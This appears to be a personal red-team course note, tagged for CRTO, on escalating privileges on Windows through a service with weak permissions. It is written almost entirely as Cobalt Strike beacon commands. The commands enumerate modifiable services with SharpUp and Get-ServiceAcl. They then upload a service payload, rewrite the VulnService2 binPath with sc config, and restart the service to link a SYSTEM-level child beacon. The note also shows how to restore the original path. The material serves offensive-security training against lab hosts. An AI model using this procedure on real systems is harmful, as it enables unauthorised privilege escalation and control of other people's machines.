The weak permissions are on the service, unlike [[Weak Service Binary Permissions]].


## 🖊️ Enumeration

1) Using SharpUP check for "modifiable" services

`beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices`

2) You then need to see which permissions are modifiable of the service, use this [powershell script](https://github.com/Sambal0x/tools/blob/master/Get-ServiceAcl.ps1)

`beacon> powershell-import C:\Tools\Get-ServiceAcl.ps1
`beacon> powershell Get-ServiceAcl -Name VulnService2 | select -expand Access`

You need to check the service rights (what can you do with it), and who has access to it (IdentityReference)

3) What you want to do is change the path of the service for another location where your payload is, but first validate the location of the service:

	`beacon> run sc qc VulnService2`

4) check the "binary path name", now change it to the location of your payload:

```
beacon> mkdir C:\Temp
beacon> cd C:\Temp
beacon> upload C:\Payloads\tcp-local_x64.svc.exe

beacon> run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe
[SC] ChangeServiceConfig SUCCESS
```

LEAVE A BLANK SPACE AFTER THE EQUAL:
binPath= C:\...

That is necessary.

5) Recheck the path is now updated
6) Restart the service and connect to [[Raw TCP Listener]] beacon :
```
beacon> run sc stop VulnService2
beacon> run sc start VulnService2

beacon> connect localhost 4444
[+] established link to child beacon: 10.10.123.102
```


## 📔 Restore Path

- Make sure if the original path had quotes, if it had you can restore it like this:

```
beacon> run sc config VulnService2 binPath= \""C:\Program Files\Vulnerable Services\Service 2.exe"\"
[SC] ChangeServiceConfig SUCCESS
```

##  📗 Action to perform 

1. 


### Properties
---
📆 created   {{10-02-2024}} 12:39
🏷️ tags: #redteam #crto 

---

